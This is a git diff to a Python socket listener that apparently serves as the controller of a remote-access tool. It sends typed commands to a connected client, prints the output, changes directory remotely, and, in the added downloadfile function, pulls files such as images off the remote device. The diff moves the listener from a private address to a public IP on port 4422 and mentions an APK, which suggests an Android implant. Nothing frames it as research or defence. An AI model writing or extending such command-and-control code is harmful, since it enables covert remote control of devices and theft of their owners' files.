@@ -1,6 +1,7 @@
 import socket
 import math
 import time
+import struct
 
 def create_socket(ip, port):
     sock = socket.socket()
@@ -77,7 +78,23 @@ def get_input(client):
     send(client,cmd)
     output = (recv(client))
     return cmd, output
+def downloadfile(output, client):
+    filename = output.replace("downloading ","")[:-1]
 
+    buf = bytes()
+    while len(buf) < 4:
+        buf += client.recv(4 - len(buf))
+    size = struct.unpack('!i', buf)[0]
+    with open(filename, 'wb') as f:
+        while size > 0:
+            data = client.recv(1024)
+            f.write(data)
+            size -= len(data)
+    print('Image Saved')
+    send(client, "ok")
+    print(recv(client))
+ 
+    
 def commands(cmd, output, client):
     if output.startswith("currentpath:") and cmd.startswith("cd "):
 
@@ -85,21 +102,15 @@ def commands(cmd, output, client):
         send(client, "newpath:" + newpath)
 
         output = recv(client)
-    if output.startswith("download "):
-        filesize = int(client.recv(1024).decode("utf-8"))
-        print("filesize: " +str(filesize))
-        send("ok")
-        data = client.recv(1024)
-        while len(data) != filesize:
-            data = data + client.recv(1024)
+    if cmd.startswith("download "):
+            downloadfile(output,client)
 
-        with open("tasker.apk") as a:
-            a.write(data)
+           
     return output
 
 try:
 
-    sock = create_socket("10.9.11.18",4422)
+    sock = create_socket("3.1.5.104",4422)
     client, address = connect(sock)
 
     print(recv(client))
@@ -112,5 +123,6 @@ try:
         print(output)
 
 
-except KeyboardInterrupt:     
+except KeyboardInterrupt as e:  
+    print(e)   
     exit(1)
